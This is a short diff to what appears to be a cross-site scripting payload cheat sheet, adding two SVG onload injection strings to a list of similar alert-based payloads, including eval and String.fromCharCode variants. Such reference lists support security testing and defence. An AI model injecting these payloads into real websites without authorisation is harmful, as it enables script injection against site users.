@@ -204,6 +204,8 @@ Most tools are also suitable for blind XSS attacks:
 <svg onload=alert(1)//
 <svg/onload=alert(String.fromCharCode(88,83,83))>
 <svg id=alert(1) onload=eval(id)>
+"><svg onload=alert(1)>
+"><svg onload=alert('XSS')>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
